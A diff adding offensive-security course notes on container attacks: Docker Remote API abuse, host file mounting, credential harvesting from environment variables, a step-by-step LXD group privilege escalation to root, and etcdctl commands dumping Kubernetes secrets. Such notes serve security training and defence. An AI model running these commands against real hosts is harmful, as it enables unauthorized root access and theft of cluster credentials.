@@ -18030,3 +18030,94 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 			- List repositories for a user or organization: curl -s https://hub.docker.com/v2/repositories/<username>/
 			- List images in a specified Docker registry (using the registry API): curl -u <username>:<password> https://<registry-url>/v2/_catalog
 			- List tags for an image in a registry: curl -u <username>:<password> https://<registry-url>/v2/<image-name>/tags/list
+	- Container/Kubernetes Vulnerability Scanning:
+		- Container images consist of an operating system, application, runtime, and other components packaged together. These containers are widely reused and may include open-source frameworks with known vulnerabilities. Such vulnerabilities can compromise not only individual containers but also the entire container runtime environment. Attackers use various tools, such as Trivy, Anchore, Clair, Dagda, and Snyk, to scan and identify security weaknesses in containers.
+		- Trivy (github.com):
+			- Trivy is an automated tool used for container image vulnerability scanning. Users need to specify the image name to initiate an accurate scan. Trivy detects vulnerabilities in OS packages (e.g., Alpine, RHEL, CentOS) and application dependencies (e.g., Bundler, Composer, npm, Yarn).
+			- Usage: trivy <target> [--scanners <scanner1,scanner2>] <subject>
+		- Sysdig (github.com):
+			- Sysdig identifies Kubernetes vulnerabilities by integrating with continuous integration (CI) and continuous delivery/deployment (CD) pipelines, image registries, and Kubernetes admission controllers. It also validates container images at the orchestration level using Kubernetes admission controller features. Sysdig automatically generates an inventory of image contents and continuously monitors for new vulnerabilities or common vulnerabilities and exposures (CVEs) associated with containers.
+		- Kubescape (github.com)
+		- Kube-hunter (github.com)
+		- Kubeaudit (github.com)
+		- KubiScan (github.com)
+		- Krane (github.com)
+	- Exploiting Docker Remote API:
+		- After gaining access to a target Docker host, attackers can exploit the Docker Remote API to launch further attacks. These may include cryptocurrency mining, masking IPs to initiate attacks, creating botnets for DoS attacks, installing phishing services, retrieving sensitive data (e.g., credentials), and compromising the internal network's security.
+		- Retrieving Files from the Docker Host:
+			- Attackers can create a new container and mount it to a folder on the Docker host to gain access to additional files.
+			- To pull an Alpine Linux image, run: $ docker -H <Remote IP:Port> pull alpine
+			- Next, create a container from the image: $ docker -H <Remote IP:Port> run -t -d alpine
+			- After creating the container, run the following command to list files stored on the Docker host: $ docker -H <Remote IP:Port> exec modest_goldstine ls
+			- Similarly, attackers can mount the host’s /etc directory to a container to retrieve contents such as the /etc/hosts file. Accessing this file allows attackers to modify host entries for malicious purposes.
+			- Additionally, attackers can access data stored outside the host by identifying mounted volumes within the container. The docker inspect command can detect external storage mounts such as Amazon S3 or Network File System (NFS). If a mount has write access, attackers can manipulate stored files.
+		- Scanning the Internal Network:
+			- If an attacker creates a container within an existing Docker network bridge, they gain access to all hosts reachable by the primary Docker host.
+			- To scan the internal network and identify running services using Nmap, execute: $ docker -H <docker host> run --network=host --rm marsmensch/nmap -ox <IP Range>
+		- Retrieving Credentials:
+			- Environment variables are commonly used in Docker to pass credentials as arguments when running containers. Attackers can use the docker inspect command to find environment variables stored on the Docker host. Running the env command inside a container reveals details, including credentials used during container initialization.
+			- Commands to retrieve credentials:
+				$ docker -H [docker remote host] inspect [container name]
+				$ docker -H [docker remote host] exec -i [container name] env
+		- Querying Databases:
+			- After obtaining credentials, attackers can query MySQL containers to extract sensitive database information.
+			- To find MySQL containers on the target Docker host: $ docker -H [docker remote host] ps | grep mysql
+			- To retrieve MySQL credentials: $ docker -H [docker remote host] exec -i some-mysql env
+			- Using the retrieved credentials, attackers can list databases inside the MySQL container: $ docker -H [docker host] exec -i some-mysql mysql -u root -p<password> -e "SHOW DATABASES;"
+		- Note: These activities can only be performed after attackers have escalated their privileges to an administrative level.
+	- Hacking Container Volumes:
+		- In Kubernetes, containers use volumes to share filesystems and manipulate container files. A volume functions like a directory that stores files and is accessible to all containers within a pod. Kubernetes supports various types of volumes, such as NFS (Network File System) and iSCSI (Internet Small Computer Systems Interface), using different protocols. Weak or default configurations in these volumes can be exploited by attackers to escalate privileges and move laterally within the internal network.
+		- Accessing Master Nodes:
+			- Volume configurations, such as iSCSI, store configuration details as secrets. If attackers gain access to the Kubernetes API or etcd, they can retrieve these configuration details, compromising the security of the volumes.
+		- Accessing Nodes:
+			- Kubelet manages pods, meaning that if attackers gain access to a node within a pod, they can access all volumes used by that pod. Additionally, attackers can use filesystem tools to view logs and gather useful information about the node. For example, using the df command, attackers can retrieve configuration details of volumes utilizing NFS.
+		- Accessing Containers:
+			- Similar to accessing nodes, attackers can obtain the same information from within a container. By exploiting volumes from a compromised container, attackers can configure the hostPath volume type to extract sensitive data from the node. They can also use filesystem tools to browse all mounted volumes.
+		- Note: Attackers can only perform these activities after escalating their privileges to an administrative level.
+	- LXD/LXC Container Group Privilege Escalation:
+		- LXD is a system container manager, while LXC is its underlying container runtime. They are commonly used to run full Linux distributions within containers. If a user is part of the lxd group on a system, they can exploit this membership to escalate their privileges to root. This is because members of the lxd group have significant control over container creation and management, which can be leveraged to gain access to the host system.
+		- Steps to Perform LXD/LXC Group Privilege Escalation:
+			- Follow these steps to execute privilege escalation using LXD/LXC:
+			- Verify LXD Group Membership:
+				- Before proceeding, check if you are a member of the lxd group using: id
+				- If your user is part of the lxd group, you can proceed with the escalation steps.
+			- Install Required Tools:
+				- Ensure you have distrobuilder installed, as it is necessary for building custom Linux distribution images for LXD/LXC containers.
+			- Create an Alpine Linux Image:
+				- Run the following commands to set up and create an Alpine Linux image:
+					mkdir -p $HOME/ContainerImages/alpine/
+					cd $HOME/ContainerImages/alpine/
+					wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+				- Now, build the Alpine image: sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
+			- Import the Alpine Image into LXD:
+				- After preparing the Alpine Linux image, import it into LXD: lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+				- Note: lxd.tar.xz and rootfs.squashfs are example filenames and may vary based on the generated files.
+			- Verify the Image in LXD:
+				- Check if the image has been successfully added: lxc image list
+			- Create and Configure a Privileged Container:
+				- Create a new container and enable privileged mode: lxc init alpine privesc -c security.privileged=true
+				- Verify the container list: lxc list
+				- Next, add the host’s root filesystem as a mount inside the container: lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+			- Start the Container and Gain Root Access:
+				- Execute the container and gain root access to the host system:
+					lxc start privesc
+					lxc exec privesc /bin/sh
+				- At this point, you should have root access to the host system via the privileged container.
+	- Post-Enumeration on Kubernetes etcd:
+		- Kubernetes is a distributed computing platform that requires a distributed database, such as etcd. etcd is a consistent, distributed key-value store where Kubernetes cluster data, service discovery details, API objects, and other critical information are stored. The API server communicates with etcd to retrieve and store information based on requests from other Kubernetes components. Gaining access to etcd is equivalent to obtaining root-level access to the system.
+		- In Kubernetes, only the API server is allowed to access the etcd store. However, attackers may attempt to enumerate etcd processes, configuration files, and open ports (particularly port 2379) to identify endpoints connected to the Kubernetes environment.
+		- For example, attackers can use the following command to enumerate the location of the etcd server and PKI information: ps -ef | grep apiserver
+		- Attackers may also enumerate metadata services provided by cloud providers to identify the etcd server's location and retrieve critical information such as certificates and key files. After gathering information about the etcd server and PKI, attackers can browse registries to extract cluster data.
+		- For example, they can run the following command to enumerate secrets stored in the Kubernetes cluster:
+			ETCDCTL_API=3 ./etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+			  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
+			  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
+			  --endpoints=https://127.0.0.1:2379 get /registry/ --prefix | grep -a '/registry/secrets/'
+		- Additionally, attackers can retrieve a specific key and convert it into YAML format using:
+			ETCDCTL_API=3 ./etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+			  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
+			  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
+			  --endpoints=https://127.0.0.1:2379 get /registry/secrets/kube-system/weave-net-token-nmb26 \
+			  | ./auger decode -o yaml
+		- By decoding keys, attackers can extract endpoint details from the kubeconfig file. They can leverage this information to escalate privileges and gain access to node-level resources.
+		- Note: Attackers can perform these actions only after escalating their privileges to an administrative level.
